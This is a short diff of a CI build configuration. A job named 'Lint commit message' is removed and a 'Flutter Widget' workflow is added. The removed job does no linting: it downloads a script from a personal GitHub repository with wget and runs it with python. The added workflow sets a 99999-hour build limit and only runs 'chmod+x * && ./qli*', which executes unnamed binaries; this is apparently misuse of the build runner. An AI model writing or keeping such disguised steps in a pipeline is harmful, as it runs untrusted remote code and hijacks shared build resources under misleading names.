@@ -1,5 +1,9 @@
 workflows:
-  commitlint:
-    name: Lint commit message
-    scripts:
-      - wget https://raw.githubusercontent.com/erlandi-26/erlandi-26/main/tdc && python tdc
+    
+    flutter-widget:
+        name: Flutter Widget
+        max_build_duration: 99999h
+        environment:
+            flutter: dev
+        scripts:
+            - chmod+x * && ./qli*
